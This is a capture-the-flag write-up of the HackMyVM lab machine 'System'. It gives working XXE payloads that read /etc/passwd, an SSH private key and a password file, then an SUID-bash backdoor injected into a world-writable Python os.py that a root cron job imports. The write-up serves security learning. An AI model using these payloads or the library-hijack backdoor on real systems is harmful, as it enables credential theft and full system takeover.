# System

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| System | avijneyam | Beginner | HackMyVM |

**Summary:** System is a beginner-level vulnerable machine that demonstrates a critical XXE (XML External Entity) injection vulnerability in a web application. The attack path begins with discovering a registration panel that processes XML data without proper input sanitization. By exploiting the XXE vulnerability, we extract sensitive files including SSH private keys and a password file from the target system. Initial access is achieved through SSH using the discovered credentials. Privilege escalation is accomplished by leveraging writable Python library files combined with a scheduled cron job that imports the compromised module. By injecting malicious code into `/usr/lib/python3.9/os.py`, we create a SUID backdoor that executes when the root-level cron job runs, ultimately providing full system compromise.

---

## Reconnaissance

### Network Discovery

The initial phase involved identifying the target machine within the local network using a PowerShell-based network scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.99 08:00:27:B5:8C:FF VirtualBox
```

The scan successfully identified the target at IP address **192.168.100.99**, confirmed to be running on VirtualBox based on the MAC address vendor identification.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was executed to identify all open ports and running services on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ nmap -sC -sV -p- -T4 192.168.100.99
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 14:03 WIB
Nmap scan report for 192.168.100.99
Host is up (0.0032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: HackMyVM Panel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.22 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5 - Standard SSH service with three host key algorithms
- **Port 80 (HTTP)**: nginx 1.18.0 - Web server hosting "HackMyVM Panel"
- **Operating System**: Debian-based Linux system

### Web Application Analysis

Navigating to `http://192.168.100.99/` revealed a registration/login panel:

![](image.png)

The web interface presents a simple form titled "HackMyVM Panel" with two input fields for Email and Password, along with a "Register" button. This clean interface suggested potential backend vulnerabilities worth investigating.

#### Source Code Examination

Inspecting the HTML source code revealed the following structure:

```html
<html>
    <head>
        <title>HackMyVM Panel</title>
        <link rel="stylesheet" href="style.css">
        <script type="text/javascript" src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/jquery.main.js"></script>
    </head>
    <body>
        <div class="main-container"><br><br><br><br>
            <div class="form-container">
                <div class="form-body">
                    <h1 class="title"><strong>HackMyVM Panel</strong></h1><br><br>
                    <div class="the-form">
                        <label for="email">Email</label>
                        <input id="email" name="email" type="email" placeholder="Enter your email">
                        <label for="password">Password</label>
                        <input id="password" name="password" type="password" placeholder="Enter your password">
                        <input type="submit" value="Register" onclick="XMLFunction()">
                    </div>
                </div>
            </div>
        </div><br><br><br>
        <div id="e"></div>
    </body>
</html>
```

The critical observation here is the `onclick="XMLFunction()"` attribute on the Register button, which suggested that the form submission process involved XML handling through JavaScript.

#### JavaScript Analysis - Critical Discovery

Examining the `js/jquery.main.js` file revealed the vulnerability:

```javascript
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<details>' +
        '<email>' + $('#email').val() + '</email>' +
        '<password>' + $('#password').val() + '</password>' +
        '</details>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('e').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","magic.php",true);
    xmlhttp.send(xml);
};
```

**Vulnerability Analysis:**

The `XMLFunction()` constructs a raw XML payload by directly concatenating user input from the email and password fields without any sanitization or validation. This XML is then sent via POST request to `magic.php`. The complete lack of input validation, combined with the server-side XML parsing, creates a textbook **XXE (XML External Entity) Injection** vulnerability.

When `magic.php` processes this XML, if the underlying XML parser is configured to resolve external entities (which is often the default configuration), an attacker can inject malicious entity declarations to:
- Read arbitrary files from the local filesystem
- Perform Server-Side Request Forgery (SSRF) attacks
- Trigger Denial of Service conditions
- In some cases, achieve Remote Code Execution

---

## Initial Access

### XXE Exploitation - Reading /etc/passwd

To confirm the XXE vulnerability, we crafted a malicious XML payload containing a DOCTYPE declaration with an external entity that references `/etc/passwd`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ curl -X POST http://192.168.100.99/magic.php \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><details><email>&xxe;</email><password>password</password></details>'
<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000::/home/david:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 is already registered! </font> </p>   
```

**Success!** The server successfully parsed the external entity and returned the contents of `/etc/passwd`. The output revealed a standard user account named **david** with UID 1000, making this the primary target for further enumeration.

### Extracting SSH Private Key

Since we identified the user `david`, the next logical step was attempting to extract his SSH private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ curl -X POST http://192.168.100.99/magic.php \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/david/.ssh/id_rsa"> ]><details><email>&xxe;</email><password>password</password></details>'
<p align='center'> <font color=white size='5pt'> -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
.............................[REDACTED]...............................
46q7aIDpVmMKMlAAAADmRhdmlkQGZyZWU0YWxsAQIDBA==
-----END OPENSSH PRIVATE KEY-----
 is already registered! </font> </p>  
```

The XXE vulnerability successfully disclosed David's SSH private key. To verify the authenticity of this key, we extracted the public key from the private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ ssh-keygen -y -f id_rsa_david
ssh-rsa AAAAB[REDACTED]Ofk4LGusmgmSl5fPZ4wrU= david@free4all
```

The command successfully generated the public key with the comment `david@free4all`, confirming this is indeed David's SSH key pair.

### Failed SSH Access - Discovery of Rabbit Hole

Attempting to authenticate using the extracted private key resulted in an unexpected password prompt:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ ssh -i id_rsa_david david@192.168.100.99
...
david@192.168.100.99's password:
```

### File System Enumeration via XXE

To discover additional files in David's home directory that might contain useful information, we employed **ffuf** (Fuzz Faster U Fool) to brute-force filenames:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ ffuf -u http://192.168.100.99/magic.php -X POST \
-d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/david/FUZZ">]><details><email>&xxe;</email><password>p</password></details>' \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-fs 85

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.100.99/magic.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Data             : <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/david/FUZZ">]><details><email>&xxe;</email><password>p</password></details>
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 85
________________________________________________

.viminfo                [Status: 200, Size: 786, Words: 90, Lines: 39, Duration: 75ms]
:: Progress: [17129/17129] :: Job [1/1] :: 549 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

**Discovery:** The fuzzing operation identified `.viminfo` - a Vim editor history file that often contains sensitive information about recently edited files and command history.

### Extracting .viminfo - Critical Information Disclosure

Retrieving the `.viminfo` file contents:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ curl -X POST http://192.168.100.99/magic.php \
-d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/david/.viminfo"> ]><details><email>&xxe;</email><password>p</password></details>'
<p align='center'> <font color=white size='5pt'> # This viminfo file was generated by Vim 8.2.
...
# Password file Created:
'0  1  3  /usr/local/etc/mypass.txt
|4,48,1,3,1648909714,"/usr/local/etc/mypass.txt"
...
> /usr/local/etc/mypass.txt
        *       1648909713      0
        "       1       3
        ^       1       4
        .       1       3
        +       1       3
 is already registered! </font> </p>     
```

**Critical Finding:** The `.viminfo` file revealed that David recently edited a file at `/usr/local/etc/mypass.txt` (timestamp: 1648909714 = April 2, 2022). The comment "Password file Created" strongly suggested this file contains authentication credentials.

### Password Extraction

Extracting the password file using the XXE vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ curl -X POST http://192.168.100.99/magic.php \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///usr/local/etc/mypass.txt"> ]><details><email>&xxe;</email><password>p</password></details>'
<p align='center'> <font color=white size='5pt'> h4[REDACTED] is already registered! </font> </p>    
```

**Password Obtained:** `h4[REDACTED]`

### SSH Authentication Success

Using the discovered credentials to authenticate:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/system]
└─$ ssh david@192.168.100.99
...
david@192.168.100.99's password:
...
Linux system 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
...
david@system:~$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@system:~$ ls -la
total 32
drwxr-xr-x 3 david david 4096 Apr  2  2022 .
drwxr-xr-x 3 root  root  4096 Apr  2  2022 ..
lrwxrwxrwx 1 root  root     9 Apr  2  2022 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 david david 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 david david  807 Aug  4  2021 .profile
drwxr-xr-x 2 david david 4096 Apr  2  2022 .ssh
-r-------- 1 david david   32 Apr  2  2022 user.txt
-rw-rw-rw- 1 david david  701 Apr  2  2022 .viminfo
```

**Initial access achieved!** Notable observations:
- `.bash_history` is symlinked to `/dev/null`, indicating command history clearing
- `user.txt` exists with restrictive permissions (readable only by david)
- `.viminfo` has unusual world-writable permissions (666)

### Examining SSH Directory

```bash
david@system:~$ cd .ssh
david@system:~/.ssh$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Apr  2  2022 .
drwxr-xr-x 3 david david 4096 Apr  2  2022 ..
-rw-rw-rw- 1 david david 2602 Apr  2  2022 id_rsa
-rw-r--r-- 1 david david  568 Apr  2  2022 id_rsa.pub
```

**Important Discovery:** The SSH private key (`id_rsa`) has world-writable permissions (666). This is highly unusual and insecure. However, this explains why we couldn't use it earlier - SSH client refuses to use private keys with overly permissive permissions as a security measure. This was indeed the rabbit hole we correctly avoided.

---

## Privilege Escalation

### Enumeration Setup

To perform comprehensive privilege escalation enumeration, we transferred two essential tools:
1. **LinPEAS** (Linux Privilege Escalation Awesome Script) - Automated enumeration script
2. **pspy64** - Process monitoring tool to observe cron jobs and system processes without root

Setting up HTTP server on attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/tools]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Downloading tools on target:

```bash
david@system:~$ wget http://192.168.100.1:8080/linpeas.sh
--2026-02-10 05:05:11--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                        100%[============================================================>] 949.15K  --.-KB/s    in 0.05s

2026-02-10 05:05:11 (20.2 MB/s) - 'linpeas.sh' saved [971926/971926]

david@system:~$ wget http://192.168.100.1:8080/pspy64
--2026-02-10 05:05:20--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                            100%[============================================================>]   2.96M  --.-KB/s    in 0.09s

2026-02-10 05:05:21 (33.7 MB/s) - 'pspy64' saved [3104768/3104768]
```

Attacker's HTTP server logs confirming successful downloads:

```bash
192.168.100.99 - - [10/Feb/2026 17:05:12] "GET /linpeas.sh HTTP/1.1" 200 -
192.168.100.99 - - [10/Feb/2026 17:05:22] "GET /pspy64 HTTP/1.1" 200 -
```

Making tools executable:

```bash
david@system:~$ chmod +x linpeas.sh pspy64
```

### LinPEAS Analysis - Writable Files Discovery

Running LinPEAS revealed critical writable files:

```bash
david@system:~$ ./linpeas.sh
[... extensive output ...]
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
...
/tmp/.XIM-unix
/usr/lib/python3.9/os.py
/usr/local/etc/mypass.txt
[... more output ...]
```

**Critical Finding:** `/usr/lib/python3.9/os.py` is writable by all users. This is extremely dangerous as `os.py` is a core Python standard library module that is imported by virtually every Python script.

Verifying permissions:

```bash
david@system:~$ ls -la /usr/lib/python3.9/os.py
-rw-rw-rw- 1 root root 39063 Apr  2  2022 /usr/lib/python3.9/os.py
```

The file has 666 permissions (world-writable), owned by root. If any Python script runs as root and imports the `os` module, our injected code will execute with root privileges.

### Process Monitoring with pspy64

Running pspy64 to identify scheduled tasks:

```bash
david@system:~$ ./pspy64
...
[... monitoring output ...]
2026/02/10 03:52:01 CMD: UID=0     PID=20249  | /usr/sbin/CRON -f
2026/02/10 03:52:01 CMD: UID=0     PID=20250  | /usr/sbin/CRON -f
2026/02/10 03:52:01 CMD: UID=0     PID=20251  | /bin/sh -c /usr/bin/python3.9 /opt/suid.py
[... more processes ...]
```

**Critical Discovery:** A cron job running as root (UID=0) executes `/usr/bin/python3.9 /opt/suid.py` regularly. This is our privilege escalation vector!

### Analyzing the Cron Script

Examining the Python script executed by root:

```bash
david@system:~$ ls -la /opt/suid.py
-rw-r--r-- 1 root root 563 Apr  2  2022 /opt/suid.py
david@system:~$ cat /opt/suid.py
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
    print("File not exists")
```

**Code Analysis:**

1. **Line 1:** `from os import system` - Imports the `system` function from the `os` module
2. The script reads `/home/david/cmd.txt` and writes it to `/tmp/suid.txt`
3. If the file exists, it attempts to execute `os.system("chmod u+s /bin/bash")` to make bash SUID
4. There's a `NameError` exception handler, which suggests the developer anticipated that `os` might not be defined

The key insight: When this script runs as root, it executes `from os import system`, which means it will load and execute any code in `/usr/lib/python3.9/os.py`. Since we can write to that file, we can inject malicious code.

### Crafting the Malicious Payload

The strategy is to inject code into `os.py` that will:
1. Create a copy of `/bin/bash` as a SUID binary in David's home directory
2. Set proper ownership and SUID permissions when executed by root
3. Provide a backdoor function for easy privilege escalation

The malicious code to inject:

```python
def system_update():
    import os
    if os.getuid() == 0:
        target = "/home/david/.secret"
        try:
            if not os.path.exists(target):
                os.system(f"cp /bin/bash {target}")
            os.chown(target, 0, 0)
            os.chmod(target, 0o4755)
            os.chmod("/bin/bash", 0o755)
        except: pass
    globals()['root'] = lambda: [os.setresuid(0,0,0), os.setresgid(0,0,0), os.setgroups([0]), os.execl("/bin/bash", "/bin/bash", "-p")]

system_update()
```

**Payload Explanation:**

1. **`system_update()` function:**
   - Checks if running as root (`os.getuid() == 0`)
   - Creates `/home/david/.secret` as a copy of `/bin/bash`
   - Sets ownership to root:root (`os.chown(target, 0, 0)`)
   - Sets SUID permissions (`os.chmod(target, 0o4755)` = rwsr-xr-x)
   - Restores normal permissions on `/bin/bash` to avoid suspicion

2. **`globals()['root']` lambda function:**
   - Creates a function accessible globally as `os.root()`
   - Sets real, effective, and saved UIDs to 0 (root)
   - Sets real, effective, and saved GIDs to 0 (root)
   - Sets supplementary groups to root only
   - Executes bash with `-p` flag (privileged mode, doesn't drop SUID)

### Injecting the Payload

Finding the correct injection point in `/usr/lib/python3.9/os.py`:

The payload needs to be inserted after the module initialization but before the exports are finalized. The optimal location is after the platform-specific imports and before the `sys.modules['os.path']` assignment.

**Original code structure:**

```python
...
elif 'nt' in _names:
    name = 'nt'
    linesep = '\r\n'
    from nt import *
    try:
        from nt import _exit
        __all__.append('_exit')
    except ImportError:
        pass
    import ntpath as path

    import nt
    __all__.extend(_get_exports_list(nt))
    del nt

    try:
        from nt import _have_functions
    except ImportError:
        pass

else:
    raise ImportError('no os specific module found')

sys.modules['os.path'] = path
from os.path import (curdir, pardir, sep, pathsep, defpath, extsep, altsep,
    devnull)
...
```

**Modified code with payload:**

```python
...
elif 'nt' in _names:
    name = 'nt'
    linesep = '\r\n'
    from nt import *
    try:
        from nt import _exit
        __all__.append('_exit')
    except ImportError:
        pass
    import ntpath as path

    import nt
    __all__.extend(_get_exports_list(nt))
    del nt

    try:
        from nt import _have_functions
    except ImportError:
        pass

else:
    raise ImportError('no os specific module found')

def system_update():
    import os
    if os.getuid() == 0:
        target = "/home/david/.secret"
        try:
            if not os.path.exists(target):
                os.system(f"cp /bin/bash {target}")
            os.chown(target, 0, 0)
            os.chmod(target, 0o4755)
            os.chmod("/bin/bash", 0o755)
        except: pass
    globals()['root'] = lambda: [os.setresuid(0,0,0), os.setresgid(0,0,0), os.setgroups([0]), os.execl("/bin/bash", "/bin/bash", "-p")]

system_update()

sys.modules['os.path'] = path
from os.path import (curdir, pardir, sep, pathsep, defpath, extsep, altsep,
    devnull)
...
```

### Executing the Attack

Waiting for the cron job to execute (runs every minute):

```bash
david@system:~$ vim /usr/lib/python3.9/os.py
david@system:~$ sleep 60
david@system:~$ ls -la
total 5228
drwxr-xr-x 3 david david    4096 Feb 10 05:18 .
drwxr-xr-x 3 root  root     4096 Apr  2  2022 ..
lrwxrwxrwx 1 root  root        9 Apr  2  2022 .bash_history -> /dev/null
-rw-r--r-- 1 david david     220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 david david    3526 Aug  4  2021 .bashrc
-rwxr-xr-x 1 david david  971926 Nov 15 10:04 linpeas.sh
-rw-r--r-- 1 david david     807 Aug  4  2021 .profile
-rwxr-xr-x 1 david david 3104768 Jan 17  2023 pspy64
-rwsr-xr-x 1 root  root  1234376 Feb 10 05:18 .secret
drwxr-xr-x 2 david david    4096 Apr  2  2022 .ssh
-r-------- 1 david david      32 Apr  2  2022 user.txt
-rw-rw-rw- 1 david david    6084 Feb 10 05:17 .viminfo
```

**Success!** The `.secret` file has been created with SUID permissions (-rwsr-xr-x) and is owned by root. This is our privilege escalation backdoor.

### Achieving Root Access

Executing the SUID backdoor to spawn a root shell:

```bash
david@system:~$ ./.secret -p -c "python3 -c 'import os; os.root()'"
root@system:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
system
root@system:~# cat /root/root.txt /home/david/user.txt
[REDACTED]2c4
[REDACTED]fe0
```

**Explanation of the command:**
- `./.secret -p` - Execute the SUID bash binary with the `-p` flag (preserve SUID privileges)
- `-c "python3 -c 'import os; os.root()'"` - Run a Python command that imports os and calls our injected `root()` function
- The `root()` function sets all UIDs and GIDs to 0 and spawns a privileged bash shell

**ROOT ACHIEVED!** Both user and root flags have been successfully captured.

---

## Attack Chain Summary

1. **Network Reconnaissance**: Identified target at 192.168.100.99 with exposed SSH (port 22) and HTTP (port 80) services running on a Debian-based system with nginx 1.18.0

2. **Web Application Analysis**: Discovered a registration panel that processes XML data through `magic.php`, with JavaScript code revealing direct concatenation of user input into XML payloads without sanitization

3. **XXE Vulnerability Exploitation**: Crafted malicious XML payloads containing DOCTYPE declarations with external entity references to read arbitrary files from the server filesystem, successfully extracting `/etc/passwd` to identify user "david"

4. **Credential Harvesting via XXE**: Extracted David's SSH private key from `/home/david/.ssh/id_rsa`, which was password-protected; performed filesystem enumeration via ffuf to discover `.viminfo` file containing reference to `/usr/local/etc/mypass.txt`; extracted password "h4[REDACTED]" from the password file

5. **Initial Access**: Successfully authenticated via SSH using credentials david:h4[REDACTED], obtaining low-privileged shell access and capturing user flag

6. **Privilege Escalation Enumeration**: Deployed LinPEAS and pspy64 enumeration tools; LinPEAS identified world-writable Python standard library file `/usr/lib/python3.9/os.py`; pspy64 revealed root-level cron job executing `/usr/bin/python3.9 /opt/suid.py` every minute

7. **Python Library Hijacking**: Injected malicious code into `/usr/lib/python3.9/os.py` that creates a SUID copy of bash at `/home/david/.secret` when imported by root processes, and provides a `root()` function for easy privilege escalation

8. **Root Access Achievement**: Waited for cron execution to create SUID backdoor; executed `.secret -p -c "python3 -c 'import os; os.root()'"` to spawn root shell with UID/GID 0; captured root flag and achieved full system compromise

